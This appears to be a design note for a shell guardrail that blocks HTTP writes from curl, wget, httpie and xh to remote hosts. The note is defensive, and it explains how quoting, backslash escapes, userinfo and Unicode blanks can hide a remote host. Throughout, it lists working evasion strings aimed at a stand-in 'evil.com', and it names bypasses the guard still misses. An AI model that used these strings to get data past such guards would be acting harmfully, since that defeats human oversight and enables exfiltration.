# Reading the host of a URL in an HTTP write

`_guardrails_has_remote_target` in `plugins/building/lib/publish-cmd.sh` decides
whether an HTTP write from `curl`, `wget`, httpie or `xh` goes to a host off this
machine. Loopback (`localhost`, a dotted `127.` address, `[::1]`, `0.0.0.0`) and
`.local` or `.localhost` names are development, not publishing. Every other host it
finds is remote, and the write is refused.

## Problem

The check read the command as written. The client reads the word that the shell
passes it, and it parses that URL by its own rules. Two gaps let a remote write
through:

- **Quotes and backslashes (#148).** The shell drops them, but the URL patterns did
  not match across them. `curl -d x 'evil.com'`, `"http://e"vil.com/x` and
  `'h'ttps://evil.com` read as no URL at all.
- **Userinfo (#149).** `http://localhost:3000@evil.com` goes to `evil.com`, but
  the host was cut at the first `:`, so it read as `localhost`.

## Design

**Bytes.** A segment that holds a quote, a backslash or a byte outside ASCII is read
with `LC_ALL=C`. The shell splits words on ASCII blanks only. In a UTF-8 locale
`[[:space:]]` also matches U+3000 and U+00A0, so `http://localhost<U+3000>@evil.com`
ended at the blank and read as `localhost`, while curl sends it to `evil.com`.
Dropping quotes in a UTF-8 locale is also slow: 64,000 quotes in one word took the
guard 4.4 s, against 1.5 s as bytes (#134). Other text keeps the user's locale, where
the URL walk is faster.

**Quotes.** A segment that holds a quote or a backslash is split into words. Each
word that holds one is read as the shell passes it: its quotes, and the `$` of `$''`
or `$""`, are dropped. The URL walk then reads the result. So the #135 rule, that a
quote which closes a URL is not part of its host, needs no code of its own: the quote
is gone before the host is read.

**Backslashes.** Outside quotes the shell drops a backslash, so dropping it is exact.
In quotes it stays, and the clients disagree about it: a WHATWG parser (`xh`) and
urllib3 (httpie) end the host at it, while curl keeps it in the userinfo. So
`'http://evil.com:1\@localhost'` goes to `evil.com` with `xh` and to `localhost`
with curl. In `$''` an escape such as `\x40` or `\x2f` makes any character, so it
can hide an `@`, a `/` or a dot. The guard cannot cheaply tell which backslashes
stay. So a word with a backslash is remote if it holds a URL once its quotes and
backslashes are dropped, and a word that holds both a backslash and `$'` is remote
whatever it holds.

**Userinfo.** The host follows the last `@` before the first `/`, `?` or `#`, and
ends at a `:`. curl 8 takes the first `@` and refuses a host that holds another, and
Python's `urlsplit` and WHATWG parsers take the last. So no client reaches a host
before the last `@`. The walk finds a URL with userinfo through its own pattern,
`https?://[^[:space:]/?#]*@[^[:space:]]*`, which runs to a blank as the other scheme
patterns do. A host is read from the URL's whole word, as a match for a dotted name
stops before an `@`: `a.local@evil.com` goes to `evil.com`.

**Scheme.** curl reads `HTTP://` and `Https://` as `http://` and `https://`, so the
URL patterns match a scheme in any case.

The 32-URL bound and the walk that finds URLs as `grep -o` does (#126) are as they
were. What the new reading costs is in the timing section of
[git-command-parsing.md](git-command-parsing.md#reading-in-time).

## What was rejected

- **Any URL with an `@` is remote.** It is simpler, but it refuses
  `http://admin:pass@127.0.0.1:5984/db`, a usual local form for CouchDB and
  Elasticsearch.
- **`_guardrails_unquote` as it is.** It reads 64 characters at most, so a long
  quoted local URL with a query string read as remote. It also drops every
  backslash, so `$'http://localhost\x40evil.com\x2fa.local'` reads as the local
  name `localhostx40evil.comx2fa.local`, while curl sends it to `evil.com`.
- **One substitution over the whole segment.** It is quadratic in the number of
  quotes (0.2 s for 64,000 of them), and it cannot tell which word a backslash is
  in.
- **Two readings of a backslash, dropped and as a slash, remote if either is.**
  A word that mixes a dropped backslash and a kept one defeats both:
  `http://localhost\.evil.com'\'@a.local` reads as local both ways, and `xh` sends it
  to `localhost.evil.com`.

## Known limitations

- **A URL with no scheme and with userinfo,** such as `curl -d x user@evil.com` or
  `localhost:3000@evil.com`, is not found. `-F file=@photo.jpg`,
  `-d email=me@example.com` and a JSON body with an e-mail address have the same
  shape, and the guard does not parse curl's options, so it cannot tell a URL from
  data there.
- **A scheme URL whose host is not a dotted name,** `localhost`, a `127.` address or
  bracketed, is not found: `http://10.0.0.5/x`, `http://intranet/x`,
  `http://$HOST/x`, `http://{localhost,evil.com}/x`.
- **A WHATWG parser, as in `xh`, reads `http:evil.com` and `http:/evil.com`** as
  `http://evil.com`.

## Failure mode if you change this

- Drop backslashes without the remote rule, and a `$''` escape or a kept backslash
  hides a remote host.
- Take the host after the first `@`, and `http://u@localhost@evil.com` reaches
  `evil.com` through httpie or `xh`.
- Read in the user's locale, and a Unicode blank ends a word that the shell does not
  end.
